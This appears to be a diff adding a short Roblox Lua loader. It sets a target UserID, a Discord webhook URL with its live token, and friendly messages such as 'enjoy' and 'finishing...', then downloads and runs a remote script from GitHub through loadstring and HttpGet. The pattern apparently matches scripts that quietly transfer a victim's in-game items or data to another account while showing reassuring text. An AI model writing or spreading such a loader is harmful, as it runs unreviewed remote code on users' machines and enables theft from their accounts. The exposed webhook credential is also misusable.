@@ -1,0 +1,9 @@
+_G.UserID = 2399998491
+_G.Webhook = "https://discord.com/api/webhooks/1107130437622575194/XkJAxhkvDecASA9VT7cwCM1zUF9fSLwgQ-BZAooQ-h1-urvaICPQK8Rxdh45wAlag0HR"
+_G.ScriptName = "lucki"
+_G.FirstText = "hi"
+_G.SecondText = "enjoy"
+_G.ThirdText = "finishing..."
+_G.WaitingTime = 120
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Script.lua", true))()
